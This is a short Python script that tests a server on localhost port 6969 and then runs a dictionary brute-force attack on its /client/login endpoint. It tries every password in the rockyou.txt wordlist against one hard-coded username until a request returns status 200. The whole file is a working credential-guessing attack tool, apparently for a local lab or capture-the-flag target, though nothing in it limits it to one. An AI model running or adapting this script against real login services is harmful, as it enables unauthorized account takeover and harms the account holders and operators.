import requests

def test_localhost():
    url = "http://localhost:6969"
    try:
        response = requests.get(url)
        print(f"Status Code: {response.status_code}")
        print(f"Response Text: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

def attempt_login(username, password):
    url = "http://localhost:6969/client/login"
    headers = {
        "Content-Type": "application/json"
    }
    data = {
        "username": username,
        "password": password
    }
    try:
        response = requests.post(url, json=data, headers=headers)
        print(f"Sent request with username: {username} and password: {password}")
        print(f"Received status code: {response.status_code}")
        print(f"Response text: {response.text}")
        return response.status_code, response.text
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return None, str(e)

def main():
    username = "angelqui"
    rockyou_path = "./rockyou.txt"

    with open(rockyou_path, 'r', encoding='latin-1') as file:
        for line in file:
            password = line.strip()
            status_code, response_text = attempt_login(username, password)
            if status_code:
                print(f"Trying password: {password} - Status code: {status_code}")
                print(f"Response: {response_text}")
                if status_code == 200:  # Assuming 200 is the success status code
                    print(f"Success! Password found: {password}")
                    break
            else:
                print(f"Error encountered: {response_text}")

if __name__ == "__main__":
    # First, test if the server is running
    test_localhost()
    
    # If the server is confirmed running, test the login functionality
    main()
